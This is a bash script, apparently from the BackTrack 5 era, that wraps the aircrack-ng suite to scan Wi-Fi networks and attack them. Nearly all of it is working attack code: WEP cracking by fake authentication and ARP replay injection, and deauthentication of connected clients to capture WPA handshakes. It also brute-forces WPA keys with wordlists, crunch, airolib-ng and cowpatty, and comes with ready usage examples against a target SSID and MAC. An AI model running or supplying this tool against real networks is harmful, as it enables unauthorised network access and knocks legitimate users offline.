#!/bin/bash
# auto-aircrack.sh
# Uses the aircrack-ng suite on BT5r1 to scan for wifi networks, crack WEP, and crack WPA
# Created by jabbalover
# Licensed under the WTFPL

# REQUIRES: BT5r1-GNOME and that you startx
# This script must be run in a gnome-terminal that is running as root (try "gksudo gnome-terminal")

#iwconfig wlan0 essid ESSIDNAME key PASSWORD

VERSION="0.1"

resetModule ()
{
	W_INTERFACE=$1
	MODULE_NAME=$2
	read -p "Remove $MODULE_NAME wireless adaptor..."
	airmon-ng stop mon0
	airmon-ng stop $W_INTERFACE
	rmmod $MODULE_NAME
	rfkill block all
	rfkill unblock all
	modprobe $MODULE_NAME
	rfkill unblock all
	/etc/init.d/networking stop
	read -p "Plug in $MODULE_NAME wireless adaptor..."
	sleep 10
}

monitorWifi ()
{
	W_INTERFACE=$1
	killall dhclient3
	airmon-ng start $W_INTERFACE
}

scanWifi ()
{
	W_INTERFACE=$1
	if [ -z "`ifconfig mon0 | grep "HWaddr"`" ]; then
		monitorWifi $W_INTERFACE
	fi
	airodump-ng mon0
}

wepAttack ()
{
	W_INTERFACE=$1
	TARGET_CH=$2
	TARGET_SSID=$3
	TARGET_MAC=$4
	MY_MAC=`ifconfig $W_INTERFACE | egrep -io '[a-z0-9][a-z0-9]:[a-z0-9][a-z0-9]:[a-z0-9][a-z0-9]:[a-z0-9][a-z0-9]:[a-z0-9][a-z0-9]:[a-z0-9][a-z0-9]'`
	WAIT_TIME=$5
	CAPTURE="airodump-ng -c $TARGET_CH --bssid "$TARGET_MAC" -w "$TARGET_SSID" mon0"
	FAKE_AUTH="aireplay-ng -1 6000 -o 1 -q 10 -e "$TARGET_SSID" -a "$TARGET_MAC" -h "$MY_MAC" mon0"
	ARP_RPLY_ATCK="aireplay-ng -3 -b "$TARGET_MAC" -h "$MY_MAC" mon0"
	PTW_CRACK_WEP="aircrack-ng -b "$TARGET_MAC" -l key."${TARGET_SSID}" "${TARGET_SSID}"-01.cap" 

	if [ -z "`ifconfig mon0 | grep "HWaddr"`" ]; then
		monitorWifi $W_INTERFACE
	fi
	gnome-terminal -x sh -c "${CAPTURE}"
	sleep 5
	gnome-terminal -x sh -c "${FAKE_AUTH}"
	sleep 10
	gnome-terminal -x sh -c "${ARP_RPLY_ATCK}"
	sleep $WAIT_TIME
	gnome-terminal -x sh -c "${PTW_CRACK_WEP};killall aireplay-ng;killall airodump-ng;rm "${TARGET_SSID}"-01.* replay_arp-*"
}

wpaAttack ()
{
	W_INTERFACE=$1
	TARGET_CH=$2
	TARGET_SSID=$3
	TARGET_MAC=$4
	CONNECTED_CLIENT=$5
	CAPTURE="airodump-ng -c $TARGET_CH --bssid "$TARGET_MAC" -w "$TARGET_SSID" mon0"
	DE_AUTH="aireplay-ng -0 1 -a "$TARGET_MAC" -c "$CONNECTED_CLIENT" mon0"

	if [ -z "`ifconfig mon0 | grep "HWaddr"`" ]; then
		monitorWifi $W_INTERFACE
	fi
	gnome-terminal -x sh -c "${CAPTURE}"
	gnome-terminal -x sh -c "${DE_AUTH};rm "${TARGET_SSID}"-01.csv "${TARGET_SSID}"-*.kismet.csv "${TARGET_SSID}"-*.kismet.netxml"
}

wpaBrute ()
{
	aircrack-ng ()
	{
		CAPTURE_FILE=$1
		WORD_LIST=$2
		TARGET_MAC=$3
		CONVERT_IVS="ivstools --convert "$CAPTURE_FILE" "$CAPTURE_FILE".ivs"
		CRACK_PASS="aircrack-ng -w -a 2 "$WORD_LIST" -b "$TARGET_MAC" "$CAPTURE_FILE".ivs"
		gnome-terminal -x sh -c "${CONVERT_IVS};${CRACK_PASS};bash"
	}

	crunch+aircrack-ng ()
	{
		CAPTURE_FILE=$1
		MAX_LENGTH=$2
		TARGET_MAC=$3
		CONVERT_IVS="ivstools --convert "$CAPTURE_FILE" "$CAPTURE_FILE".ivs"
		CRACK_PASS="/pentest/passwords/crunch/crunch 8 $MAX_LENGTH -f /pentest/passwords/crunch/charset.lst mixalpha-numeric-all-space-sv | aircrack-ng -a 2 -w - -b "$TARGET_MAC" "$CAPTURE_FILE".ivs"
		gnome-terminal -x sh -c "${CONVERT_IVS};${CRACK_PASS};bash"
	}

	airolib-ng+aircrack-ng ()
	{
		CAPTURE_FILE=$1
		WORD_LIST=$2
		TARGET_SSID=$3
		CONVERT_IVS="ivstools --convert "$CAPTURE_FILE" "$CAPTURE_FILE".ivs"
        IMPORT_LIST="airolib-ng crackwpa --import passwd "$WORD_LIST"; airolib-ng crackwpa --import essid "$TARGET_SSID"; airolib-ng crackwpa --stats; airolib-ng crackwpa --clean all; airolib-ng crackwpa --batch;airolib-ng crackwpa --verify all"
		CRACK_PASS="aircrack-ng -a 2 -r crackwpa "$TARGET_SSID".ivs"
		gnome-terminal -x sh -c "${CONVERT_IVS};${IMPORT_LIST};${CRACK_PASS};bash"
	}

	cowpatty ()
	{
		CAPTURE_FILE=$1
		WORD_LIST=$2
		TARGET_SSID=$3
		CRACK_PASS="cowpatty -r "$CAPTURE_FILE" -f "$WORD_LIST" -s "$TARGET_SSID""
		gnome-terminal -x sh -c "${CRACK_PASS};bash"
	}

	genpmk+cowpatty ()
	{
		CAPTURE_FILE=$1
		WORD_LIST=$2
		TARGET_SSID=$3
		GEN_PMK="genpmk -f "$WORD_LIST" -s "$TARGET_SSID" -d "$TARGET_SSID"-hash"
		CRACK_PASS="cowpatty -r "$CAPTURE_FILE" -d hash -s "$TARGET_SSID""
		gnome-terminal -x sh -c "${GEN_PMK}"
		gnome-terminal -x sh -c "${CRACK_PASS};bash"
	}

	case "$1" in
		-1) aircrack-ng $2 $3 $4
			;;
		-2) crunch+aircrack-ng $2 $3 $4
			;;
		-3) airolib-ng+aircrack-ng $2 $3 $4
			;;
		-4) cowpatty $2 $3 $4
			;;
		-5) genpmk+cowpatty $2 $3 $4
			;;
	esac
}

case "$1" in 
	-r) resetModule $2 $3
		;;
	-s)	scanWifi $2
		;;
	-w) wepAttack $2 $3 $4 $5 $6
		;;
	-W) wpaAttack $2 $3 $4 $5 $6
		;;
	-b) wpaBrute $2 $3 $4 $5
		;;
	*)	echo "*** auto_air.sh v$VERSION by jabbalover ***
Uses the aircrack-ng suite on BT5r1 to scan for wifi networks, crack WEP and crack WPA
REQUIRES: BT5r1-GNOME and that you startx.

$0 [options]
-r
	*reset wireless module*
	USAGE:   $0 -r W_INTERFACE MODULE_NAME
	EXAMPLE: $0 -r wlan0 rtl8187

-s
	*scan for wireless APs*
	USAGE:   $0 -s W_INTERFACE
	EXAMPLE: $0 -s wlan0

-w
	*attack WEP*
	USAGE:   $0 -w W_INTERFACE TARGET_CH TARGET_SSID TARGET_MAC WAIT_TIME
	EXAMPLE: $0 -w wlan0 6 linksys 01:02:03:04:05:06 30
-W
	*attack WPA*
	USAGE:   $0 -W W_INTERFACE TARGET_CH TARGET_SSID TARGET_MAC CONNECTED_CLIENT
	EXAMPLE: $0 -W wlan0 6 linksys 01:02:03:04:05:06 A6:A5:A4:A3:A2:A1

-b
	*bruteforce WPA/WPA2 key*
	-1 (aircrack-ng)
		CAPTURE_FILE WORD_LIST TARGET_MAC 
	-2 (crunch+aircrack-ng)
		CAPTURE_FILE MAX_LENGTH TARGET_MAC
	-3 (airolib-ng+aircrack-ng)
		CAPTURE_FILE WORD_LIST TARGET_SSID
	-4 (cowpatty)
		CAPTURE_FILE WORD_LIST TARGET_SSID
	-5 (genpmk+cowpatty)
		CAPTURE_FILE WORD_LIST TARGET_SSID
	EXAMPLE: $0 -b -5 capture.cap oxford.dic linksys" 
		;;
esac
